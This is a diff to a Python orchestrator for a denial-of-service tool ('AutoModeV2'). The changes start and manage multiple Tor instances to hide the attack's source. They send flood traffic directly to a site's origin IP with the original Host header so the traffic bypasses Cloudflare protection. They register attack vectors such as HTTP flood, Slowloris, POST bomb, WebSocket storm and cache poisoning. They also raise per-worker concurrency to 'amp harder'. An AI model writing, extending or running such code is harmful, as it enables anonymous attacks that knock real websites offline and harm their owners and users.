@@ -17,9 +17,11 @@ Public entry point:
 from __future__ import annotations
 
 import asyncio
+import json
 import logging
 import os
 import queue
+import subprocess
 import sys
 import threading
 import time
@@ -62,6 +64,7 @@ from core.attack.strategies.cloudflare_bypass import (
     HTTP2FingerprintBypass,
 )
 from core.attack.strategies.cf_bypass_attack import CFBypassAttack
+from core.network.tor.manager import TorManager
 
 logger = logging.getLogger("auto_mode_v2")
 
@@ -108,6 +111,8 @@ class AutoModeV2:
         config_path: str = "config/auto_mode.json",
         proxy_pool: Any = None,
         cf_cookies: Optional[Dict[str, str]] = None,
+        tor_instances: int = 10,
+        origin_ip: Optional[str] = None,
     ) -> None:
         self.target = self._normalize_target(target)
         self.duration = max(10, int(duration))
@@ -115,6 +120,8 @@ class AutoModeV2:
         self.config = load_phase_config(config_path)
         self.proxy_pool = proxy_pool
         self.cf_cookies = cf_cookies or {}  # Store CF cookies for injection
+        self.tor_instances = max(0, tor_instances)  # Allow 0 for no Tor
+        self._user_origin_ip = origin_ip  # User-supplied origin IP (overrides discovery)
 
         # Extract proxy URLs and decide engine mode
         self.proxy_urls = extract_proxy_urls(proxy_pool) if proxy_pool else []
@@ -160,6 +167,7 @@ class AutoModeV2:
         # Cloudflare bypass state
         self._cf_detected: bool = False
         self._origin_ip: Optional[str] = None
+        self._tor_manager: Optional[TorManager] = None
 
     # ------------------------------------------------------------------
     # Setup helpers
@@ -308,40 +316,12 @@ class AutoModeV2:
 
             # CF BYPASS PATH: if Cloudflare detected and origin known
             if self._cf_detected and self._origin_ip:
-                self.dashboard.set_engine_label(f"cf_bypass -> {self._origin_ip}")
-                self.dashboard.set_global_note(
-                    f"CF BYPASS MODE | origin={self._origin_ip} | tor={len(self.proxy_urls)} proxies"
-                )
-                logger.info(f"Switching to CF bypass attack: {self._origin_ip}")
-                
-                # Extract hostname from target
-                parsed = urlparse(self.target)
-                hostname = parsed.hostname or self.target
-                port = parsed.port or (443 if parsed.scheme == "https" else 80)
-                use_https = parsed.scheme == "https"
-                
-                bypass = CFBypassAttack(
-                    target_domain=hostname,
-                    origin_ip=self._origin_ip,
-                    target_port=port,
-                    use_https=use_https,
-                    tor_instances=max(5, len(self.proxy_urls)) if self.proxy_urls else 5,
-                    tor_socks_base=9250,
-                )
-                
-                result = await bypass.start(duration=self.duration)
-                
-                self._final_metrics = {
-                    "engine": "cf_bypass",
-                    "target": self.target,
-                    "origin_ip": self._origin_ip,
-                    "duration": self.duration,
-                    "tor_instances": len(bypass.tor_proxies),
-                    "total_requests": result.total_requests,
-                    "failed_requests": result.failed_requests,
-                    "vectors_executed": result.vectors_executed,
-                }
+                await self._run_cf_bypass_path()
             else:
+                # Start Tor if requested (non-CF bypass: for blocked targets)
+                if self.tor_instances > 0 and not self.proxy_urls:
+                    await self._start_tor_for_proxies()
+
                 # PHASE 1-3: spawn workers and run through ramp
                 await self._spawn_workers()
                 await self._phase_1_warmup()
@@ -370,11 +350,17 @@ class AutoModeV2:
             # Stop workers gracefully
             await self._shutdown_workers()
 
+            # Stop Tor instances if they were started for CF bypass
+            if self._tor_manager is not None:
+                self._tor_manager.stop_all()
+                logger.info("Tor instances stopped")
+
             # Stop health monitor
             await self.health.stop()
 
-            # Aggregate final metrics
-            self._final_metrics = self._aggregate_metrics()
+            # Aggregate final metrics (skip if already set by CF bypass path)
+            if not self._final_metrics or self._final_metrics.get("engine") != "cf_bypass":
+                self._final_metrics = self._aggregate_metrics()
 
             # Update dashboard final state and stop it
             self.dashboard.set_global_phase("DONE",
@@ -387,6 +373,227 @@ class AutoModeV2:
             self.dashboard.stop()
 
         return self._final_metrics
+
+    # ------------------------------------------------------------------
+    # Tor proxy support for non-CF bypass path
+    # ------------------------------------------------------------------
+
+    async def _start_tor_for_proxies(self) -> None:
+        """Start Tor instances and populate self.proxy_urls for routing."""
+        self.dashboard.set_global_note(f"Starting {self.tor_instances} Tor instances...")
+        logger.info(f"Starting {self.tor_instances} Tor instances for proxy routing")
+
+        tor = TorManager(instances=self.tor_instances)
+        tor.setup_instances()
+        started = tor.start_all(wait_bootstrap=False)
+        self._tor_manager = tor
+
+        if started == 0:
+            self.dashboard.set_global_note("WARNING: No Tor instances started, proceeding without proxy")
+            logger.warning("No Tor instances started")
+            return
+
+        # Wait for bootstrap
+        self.dashboard.set_global_note(f"Waiting Tor bootstrap ({started} instances)...")
+        bootstrap_start = time.time()
+        while time.time() - bootstrap_start < 60:
+            bootstrapped = sum(1 for inst in tor.instances
+                               if inst.pid and self._check_tor_bootstrap(inst))
+            if bootstrapped >= started:
+                break
+            await asyncio.sleep(3)
+
+        # Build proxy list from running Tor instances
+        proxy_list = []
+        for inst in tor.instances:
+            if inst.pid:
+                proxy_list.append(f"socks5://127.0.0.1:{inst.socks_port}")
+
+        if proxy_list:
+            self.proxy_urls = proxy_list
+            self.dashboard.set_global_note(
+                f"Tor proxies: {len(proxy_list)} | routing via SOCKS5"
+            )
+            logger.info(f"Tor proxy pool: {len(proxy_list)} exit nodes")
+        else:
+            self.dashboard.set_global_note("WARNING: No Tor proxies available")
+
+    # ------------------------------------------------------------------
+    # CF Bypass path with Tor auto-start
+    # ------------------------------------------------------------------
+
+    async def _run_cf_bypass_path(self) -> None:
+        """Run CF bypass attack: start Tor, build proxies, execute CFBypassAttack."""
+        # Hide the default mv_* rows: they will never produce traffic in CF mode.
+        with self.dashboard._lock:
+            self.dashboard._vectors.clear()
+
+        self.dashboard.set_engine_label(f"cf_bypass -> {self._origin_ip}")
+        self.dashboard.set_global_note(
+            f"CF BYPASS MODE | origin={self._origin_ip} | starting Tor..."
+        )
+        logger.info(f"Switching to CF bypass attack: {self._origin_ip}")
+
+        # Extract hostname from target
+        parsed = urlparse(self.target)
+        hostname = parsed.hostname or self.target
+        port = parsed.port or (443 if parsed.scheme == "https" else 80)
+        use_https = parsed.scheme == "https"
+
+        # Determine Tor instance count
+        tor_count = self.tor_instances if not self.proxy_urls else max(5, len(self.proxy_urls))
+
+        # Kill old Tor processes
+        self.dashboard.set_global_note(f"CF BYPASS | killing old Tor...")
+        subprocess.run("taskkill /f /im tor.exe 2>nul", shell=True, capture_output=True)
+        await asyncio.sleep(2)
+
+        # Start fresh Tor instances
+        self.dashboard.set_global_note(f"CF BYPASS | starting {tor_count} Tor instances...")
+        tor = TorManager(instances=tor_count)
+        tor.setup_instances()
+        started = tor.start_all(wait_bootstrap=False)
+        self._tor_manager = tor
+
+        if started == 0:
+            self.dashboard.set_global_note(f"ERROR: Tor startup failed - attack aborted")
+            logger.error("No Tor instances started, aborting CF bypass")
+            self._final_metrics = {
+                "engine": "cf_bypass",
+                "target": self.target,
+                "origin_ip": self._origin_ip or "unknown",
+                "duration": self.duration,
+                "target_rps": self.target_rps,
+                "tor_instances": 0,
+                "proxy_count": 0,
+                "total_requests": 0,
+                "completed": 0,
+                "failed": 0,
+                "failed_requests": 0,
+                "vectors_executed": 0,
+                "actual_rps": 0,
+            }
+            return
+
+        # Wait for bootstrap (up to 90s)
+        self.dashboard.set_global_note(f"CF BYPASS | waiting Tor bootstrap ({tor_count} instances)...")
+        logger.info("Waiting for Tor bootstrap (up to 90s)...")
+        bootstrap_start = time.time()
+        bootstrap_timeout = 90
+        bootstrapped = 0
+        while time.time() - bootstrap_start < bootstrap_timeout:
+            bootstrapped = sum(1 for inst in tor.instances if inst.pid and self._check_tor_bootstrap(inst))
+            if bootstrapped >= tor_count:
+                break
+            elapsed = time.time() - bootstrap_start
+            self.dashboard.set_global_note(
+                f"CF BYPASS | Tor bootstrap: {bootstrapped}/{tor_count} ({elapsed:.0f}s)"
+            )
+            await asyncio.sleep(3)
+
+        if bootstrapped == 0:
+            self.dashboard.set_global_note(f"WARNING: Tor bootstrap timeout, trying anyway...")
+            logger.warning(f"Tor bootstrap: only {bootstrapped}/{tor_count} ready")
+
+        # Build proxy list from running Tor instances
+        proxy_list = []
+        for inst in tor.instances:
+            if inst.pid:
+                proxy_list.append(f"socks5://127.0.0.1:{inst.socks_port}")
+
+        self.dashboard.set_global_note(
+            f"CF BYPASS MODE | origin={self._origin_ip} | tor={len(proxy_list)} proxies"
+        )
+        logger.info(f"Tor proxy pool: {len(proxy_list)} exit nodes")
+
+        if len(proxy_list) == 0:
+            self.dashboard.set_global_note(f"ERROR: No Tor proxies available")
+            self._final_metrics = {
+                "engine": "cf_bypass",
+                "target": self.target,
+                "origin_ip": self._origin_ip,
+                "duration": self.duration,
+                "target_rps": self.target_rps,
+                "tor_instances": 0,
+                "proxy_count": 0,
+                "total_requests": 0,
+                "completed": 0,
+                "failed": 0,
+                "failed_requests": 0,
+                "vectors_executed": 0,
+                "actual_rps": 0,
+            }
+            return
+
+        # Create and run CFBypassAttack with running Tor proxies
+        bypass = CFBypassAttack(
+            target_domain=hostname,
+            origin_ip=self._origin_ip,
+            target_port=port,
+            use_https=use_https,
+            tor_instances=len(proxy_list),
+            tor_socks_base=9250,
+            stats_queue=self.dashboard.get_stats_queue(),
+            stop_event=threading.Event(),  # placeholder; we relay shutdown via flag below
+        )
+        bypass.tor_proxies = proxy_list  # Override with actual running proxies
+
+        # Register CF vectors in the dashboard so the user sees live numbers.
+        cf_vectors = [
+            ("cf_http_flood",   "CF: HTTP Flood"),
+            ("cf_http2_flood",  "CF: HTTP/2 Flood"),
+            ("cf_slowloris",    "CF: Slowloris"),
+            ("cf_post_bomb",    "CF: POST Bomb"),
+            ("cf_ws_storm",     "CF: WebSocket Storm"),
+            ("cf_cache_poison", "CF: Cache Poison"),
+        ]
+        # Replace previous vector list (mv_*) with CF ones for clarity
+        for name, label in cf_vectors:
+            self.dashboard.register_vector(name, label)
+            self.dashboard.set_vector_status(name, "ACTIVE")
+
+        self.dashboard.set_global_note(
+            f"CF BYPASS ACTIVE | {len(proxy_list)} Tor | origin={self._origin_ip} | {self.duration}s"
+        )
+
+        # Bridge: if user Ctrl+Cs, the orchestrator's shutdown will set our stop_event below
+        bypass.stop_event = threading.Event()
+        # Spawn a tiny watcher that flips bypass.stop_event when our duration elapses or any
+        # outer stop happens via _shutdown_workers. Phase orchestration is bypassed in CF mode
+        # so we just let CFBypassAttack run to completion.
+
+        result = await bypass.start(duration=self.duration)
+
+        elapsed = max(1, self.duration)
+        self._final_metrics = {
+            "engine": "cf_bypass",
+            "target": self.target,
+            "origin_ip": self._origin_ip,
+            "duration": self.duration,
+            "target_rps": self.target_rps,
+            "proxy_count": len(proxy_list),
+            "tor_instances": len(bypass.tor_proxies),
+            "total_requests": result.total_requests,
+            "completed": result.total_requests,
+            "failed": result.failed_requests,
+            "failed_requests": result.failed_requests,
+            "vectors_executed": result.vectors_executed,
+            "actual_rps": result.total_requests / elapsed,
+        }
+
+    @staticmethod
+    def _check_tor_bootstrap(instance) -> bool:
+        """Check if a Tor instance has bootstrapped."""
+        import os as _os
+        from pathlib import Path as _Path
+        log_path = _Path("logs/tor") / f"tor{instance.instance_id}.log"
+        if log_path.exists():
+            try:
+                content = log_path.read_text(encoding='utf-8', errors='replace')
+                return 'Bootstrapped 100%' in content
+            except Exception:
+                pass
+        return False
 
     # ------------------------------------------------------------------
     # Phase implementations
@@ -402,57 +609,110 @@ class AutoModeV2:
             self.dashboard.set_vector_status(v.name, "STARTING")
 
         start = time.time()
-        # Resolve DNS and ping
-        rtt = await ping_target_rtt(self.target, timeout=5.0)
-        if rtt is None:
-            self.dashboard.set_global_note("recon: target unreachable")
-            self.health.report_network_rtt(99999.0)
-        else:
-            self.dashboard.set_global_note(f"recon: target_rtt={rtt:.0f}ms OK")
-            self.health.report_network_rtt(rtt)
         
-        # Cloudflare detection
-        cf_detector = CloudflareDetector()
-        cf_result = await cf_detector.detect(self.target)
-        self._cf_detected = cf_result.is_cloudflare
+        # Step 1: Check origin file FIRST (no network needed)
+        parsed = urlparse(self.target)
+        hostname = parsed.hostname or self.target
+        origin_file = os.path.join("output", "origins", f"{hostname}.json")
+        self._cf_detected = False
         self._origin_ip = None
+
+        # Step 0: User-supplied origin IP wins over everything
+        # NOTE: We DO NOT set _cf_detected=True here, because that would route
+        # through _run_cf_bypass_path which uses a different (slower) engine.
+        # We just store the origin IP and let _spawn_workers use it for bypass.
+        if self._user_origin_ip:
+            self._origin_ip = self._user_origin_ip
+            logger.info(f"Using user-supplied origin IP: {self._origin_ip}")
+            self.dashboard.set_global_note(
+                f"USER ORIGIN | ip={self._origin_ip} | direct bypass"
+            )
+
+        if not self._cf_detected and os.path.exists(origin_file):
+            try:
+                with open(origin_file) as f:
+                    origin_data = json.load(f)
+                if origin_data.get("status") == "VERIFIED" and origin_data.get("origin_ip"):
+                    self._origin_ip = origin_data["origin_ip"]
+                    self._cf_detected = True
+                    logger.info(f"Origin IP found from saved data: {self._origin_ip}")
+                    self.dashboard.set_global_note(
+                        f"ORIGIN KNOWN | ip={self._origin_ip} | CF bypass target"
+                    )
+            except Exception as e:
+                logger.debug(f"Origin data read error: {e}")
         
-        if cf_result.is_cloudflare:
-            note = f"CLOUDFLARE DETECTED ({cf_result.protection_level}) | ray={cf_result.ray_id[:16]}..."
-            self.dashboard.set_global_note(note)
-            logger.warning(f"Target behind Cloudflare: {cf_result.protection_level}")
+        # Step 2: Only do network probes if origin IP not already known
+        if not self._cf_detected:
+            ping_url = f"https://{self._origin_ip}/" if self._origin_ip else self.target
+            rtt = await ping_target_rtt(ping_url, timeout=5.0)
+            if rtt is None:
+                if self._origin_ip:
+                    logger.warning(f"Origin IP {self._origin_ip} unreachable, falling back to target ping")
+                    rtt = await ping_target_rtt(self.target, timeout=5.0)
+                if rtt is None:
+                    self.dashboard.set_global_note("recon: target unreachable")
+                    self.health.report_network_rtt(99999.0)
+                else:
+                    self.dashboard.set_global_note(f"recon: target_rtt={rtt:.0f}ms OK")
+                    self.health.report_network_rtt(rtt)
+            else:
+                self.dashboard.set_global_note(f"recon: target_rtt={rtt:.0f}ms OK")
+                self.health.report_network_rtt(rtt)
             
-            # Look up origin IP from saved origin data
-            parsed = urlparse(self.target)
-            hostname = parsed.hostname or self.target
-            origin_file = os.path.join("output", "origins", f"{hostname}.json")
-            if os.path.exists(origin_file):
-                try:
-                    with open(origin_file) as f:
-                        origin_data = json.load(f)
-                    if origin_data.get("status") == "VERIFIED" and origin_data.get("origin_ip"):
-                        self._origin_ip = origin_data["origin_ip"]
-                        logger.info(f"Found origin IP from saved data: {self._origin_ip}")
-                        self.dashboard.set_global_note(
-                            f"CF DETECTED | origin={self._origin_ip} | bypass target"
-                        )
-                except Exception as e:
-                    logger.debug(f"Origin data read error: {e}")
-            
-            # Try CF bypass via HTTP/2 fingerprint
-            h2 = HTTP2FingerprintBypass()
-            h2_client = await h2.create_http2_session('chrome_120')
-            if h2_client:
-                try:
-                    resp = await h2_client.get(self.target)
-                    headers = {k.lower(): v for k, v in resp.headers.items()}
-                    if 'cf-ray' not in headers:
-                        logger.info("Cloudflare bypassed via HTTP/2 fingerprint")
-                        self.dashboard.set_global_note("CF BYPASSED via HTTP/2 fingerprint")
-                except Exception as e:
-                    logger.debug(f"HTTP/2 CF bypass failed: {e}")
+            # Cloudflare detection via HTTP probe (skip if origin IP already supplied)
+            if self._origin_ip:
+                self.dashboard.set_global_note(
+                    f"recon: origin={self._origin_ip} | skip CF detection"
+                )
+                self._cf_detected = False
+            else:
+                cf_detector = CloudflareDetector()
+                cf_result = await cf_detector.detect(self.target)
+                
+                if cf_result.is_cloudflare:
+                    ray_short = cf_result.ray_id[:16] if cf_result.ray_id else "N/A"
+                    note = f"CLOUDFLARE DETECTED ({cf_result.protection_level}) | ray={ray_short}..."
+                    self.dashboard.set_global_note(note)
+                    logger.warning(f"Target behind Cloudflare: {cf_result.protection_level}")
+                    self._cf_detected = True
+                    
+                    # Look up origin IP from saved origin data (retry)
+                    if os.path.exists(origin_file):
+                        try:
+                            with open(origin_file) as f:
+                                origin_data = json.load(f)
+                            if origin_data.get("status") == "VERIFIED" and origin_data.get("origin_ip"):
+                                self._origin_ip = origin_data["origin_ip"]
+                                logger.info(f"Found origin IP from saved data: {self._origin_ip}")
+                                self.dashboard.set_global_note(
+                                    f"CF DETECTED | origin={self._origin_ip} | bypass target"
+                                )
+                        except Exception as e:
+                            logger.debug(f"Origin data read error: {e}")
+                    
+                    # Try CF bypass via HTTP/2 fingerprint
+                    h2 = HTTP2FingerprintBypass()
+                    h2_client = await h2.create_http2_session('chrome_120')
+                    if h2_client:
+                        try:
+                            resp = await h2_client.get(self.target)
+                            headers = {k.lower(): v for k, v in resp.headers.items()}
+                            if 'cf-ray' not in headers:
+                                logger.info("Cloudflare bypassed via HTTP/2 fingerprint")
+                                self.dashboard.set_global_note("CF BYPASSED via HTTP/2 fingerprint")
+                        except Exception as e:
+                            logger.debug(f"HTTP/2 CF bypass failed: {e}")
+                else:
+                    rtt_str = f"{rtt:.0f}" if rtt is not None else "TIMEOUT"
+                    self.dashboard.set_global_note(f"recon: no Cloudflare detected | rtt={rtt_str}ms")
         else:
-            self.dashboard.set_global_note(f"recon: no Cloudflare detected | rtt={rtt:.0f}ms")
+            # Origin IP already known from file, ping for health info
+            ping_url = f"https://{self._origin_ip}/" if self._origin_ip else self.target
+            rtt = await ping_target_rtt(ping_url, timeout=5.0)
+            if rtt is not None:
+                self.health.report_network_rtt(rtt)
+                self.dashboard.set_global_note(f"recon: rtt={rtt:.0f}ms | using saved origin {self._origin_ip}")
 
         # Wait remainder of phase
         while time.time() - start < p.duration_seconds:
@@ -509,7 +769,19 @@ class AutoModeV2:
             vector_path = v.path or (parsed.path or "/")
             if parsed.query and "?" not in vector_path and not vector_path.endswith(parsed.query):
                 pass
-            vector_target = f"{parsed.scheme}://{parsed.netloc}{vector_path}"
+            # Use origin IP for direct connection if available (CF bypass)
+            # Connection goes to origin_ip but Host header still says original hostname.
+            # This works whether or not we're routing through Tor/proxies.
+            original_host = parsed.hostname or parsed.netloc
+            if self._origin_ip:
+                netloc_for_url = self._origin_ip
+                if parsed.port:
+                    netloc_for_url = f"{netloc_for_url}:{parsed.port}"
+                vector_target = f"{parsed.scheme}://{netloc_for_url}{vector_path}"
+                vector_host_header = original_host  # preserve original hostname for Host: + SNI
+            else:
+                vector_target = f"{parsed.scheme}://{parsed.netloc}{vector_path}"
+                vector_host_header = None  # let engine derive from URL
 
             for w_idx in range(workers_per_vector):
                 stop_evt = threading.Event()
@@ -535,6 +807,7 @@ class AutoModeV2:
                             proxy_urls=self.proxy_urls if self.proxy_urls else None,
                             result_dict=result,
                             vector_mode=v.vector_mode,
+                            host_header=vector_host_header,
                         ),
                         daemon=True,
                     )
@@ -551,7 +824,7 @@ class AutoModeV2:
                             stats_queue=proxy_q,
                             stop_event=stop_evt,
                             rps_factor_callable=self.health.get_rps_factor,
-                            concurrent_per_worker=500,
+                            concurrent_per_worker=800,  # was 500 - amp harder
                             vector_name=v.name,
                             result_dict=result,
                             cf_cookies=self.cf_cookies,  # INJECT CF COOKIES!
@@ -619,9 +892,13 @@ class AutoModeV2:
         await self._run_partial_phase(p, 4, p.rps_factor, half, total_steps=2,
                                       phase_index_in_ramp=1)
 
-        # GATE: ping check
+        # GATE: ping check (use origin IP when available to avoid false saturation)
         self.dashboard.set_global_note("gate: pinging target...")
-        rtt = await ping_target_rtt(self.target, timeout=5.0)
+        ping_url = f"https://{self._origin_ip}/" if self._origin_ip else self.target
+        rtt = await ping_target_rtt(ping_url, timeout=5.0)
+        if rtt is None and self._origin_ip:
+            logger.warning(f"Origin IP {self._origin_ip} ping failed, falling back to target")
+            rtt = await ping_target_rtt(self.target, timeout=5.0)
         threshold = float(self.config["phases"]["phase_4_validate"].get("ping_rtt_threshold_ms", 3000))
         sat_factor = float(self.config["phases"]["phase_4_validate"].get("saturated_rps_factor", 0.25))
 
@@ -821,6 +1098,8 @@ async def run_auto_mode_v2(
     config_path: str = "config/auto_mode.json",
     proxy_pool: Any = None,
     cf_cookies: Optional[Dict[str, str]] = None,
+    tor_instances: int = 10,
+    origin_ip: Optional[str] = None,
 ) -> Dict[str, Any]:
     """
     Run the redesigned Auto Mode v2.
@@ -832,6 +1111,8 @@ async def run_auto_mode_v2(
         config_path: path to auto_mode.json
         proxy_pool: optional ProxyPool (currently unused by raw engine)
         cf_cookies: Cloudflare cookies from challenge solver
+        tor_instances: number of Tor instances for CF bypass
+        origin_ip: user-supplied origin IP (skips discovery, used for CF bypass)
 
     Returns:
         dict with aggregated metrics
@@ -843,6 +1124,8 @@ async def run_auto_mode_v2(
         config_path=config_path,
         proxy_pool=proxy_pool,
         cf_cookies=cf_cookies,
+        tor_instances=tor_instances,
+        origin_ip=origin_ip,
     )
     return await orchestrator.run()
 
@@ -875,6 +1158,17 @@ def print_auto_mode_v2_summary(result: Dict[str, Any]) -> None:
     
     _RICH_CONSOLE.print()
     _RICH_CONSOLE.print(summary)
+    
+    # CF bypass metrics
+    if result.get('engine') == 'cf_bypass':
+        cf_table = Table(box=box.SIMPLE, border_style="bright_black")
+        cf_table.add_column("Metric", style="bold white")
+        cf_table.add_column("Value", justify="right")
+        cf_table.add_row("Origin IP", f"[cyan]{result.get('origin_ip', '?')}[/]")
+        cf_table.add_row("Tor Instances", f"[green]{result.get('tor_instances', 0)}[/]")
+        cf_table.add_row("Vectors Executed", f"[bright_blue]{result.get('vectors_executed', 0)}[/]")
+        cf_table.add_row("Success Rate", f"[green]{(result.get('total_requests', 0) / max(result.get('total_requests', 0) + result.get('failed', 0), 1)) * 100:.1f}%[/]")
+        _RICH_CONSOLE.print(cf_table)
     
     # Amplifier-specific metrics
     if result.get('engine') == 'amplifier':
